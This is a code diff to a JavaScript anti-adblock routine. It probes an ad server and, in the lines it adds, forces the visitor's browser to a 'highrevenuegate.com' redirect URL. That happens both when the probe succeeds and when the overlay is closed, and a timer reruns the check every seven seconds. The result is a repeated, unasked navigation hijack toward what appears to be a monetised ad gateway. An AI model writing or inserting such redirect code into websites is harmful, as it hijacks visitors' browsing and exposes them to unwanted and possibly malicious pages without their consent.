@@ -47,12 +47,13 @@ document.head.insertAdjacentHTML("beforeend", `<style>.adp {
 }</style>`);
 var xaddpsts = true;
 function addpLoadx(){
-	
 	var rxcNum = Math.round(Math.random() * 10000);
 	try {
 		fetch('https://ads.pubmatic.com/AdServer/js/gshowad.js?d='+rxcNum,{
       method: "HEAD",
       mode: "no-cors",
+    }).then(function() {
+        window.location.href = "https://www.highrevenuegate.com/pnhjy8tj?key=cb019f8aeb2e1fd2e36b88b0ca124112";
     }).catch(() => {
 			xaddpsts = false;
 			let adp_underlay = document.createElement('div');
@@ -70,21 +71,17 @@ function addpLoadx(){
 				e.preventDefault();
 				document.body.removeChild(adp_underlay);
 				document.body.removeChild(adp);
+				xaddpsts = true;
 				window.location.href = "https://www.highrevenuegate.com/pnhjy8tj?key=cb019f8aeb2e1fd2e36b88b0ca124112";
 			};
 		});
 	}
 	catch(err) {
-	  xaddpsts = false;
-	  
-	}
-	if (xaddpsts){
-		window.location.href = "https://www.highrevenuegate.com/pnhjy8tj?key=cb019f8aeb2e1fd2e36b88b0ca124112";
+	  xaddpsts = true;
 	}
 }
 var networkchecker = window.setInterval(function(){
 	if (xaddpsts){
 		window.onload=addpLoadx();
-		xaddpsts = true;
 	}
 },7000);
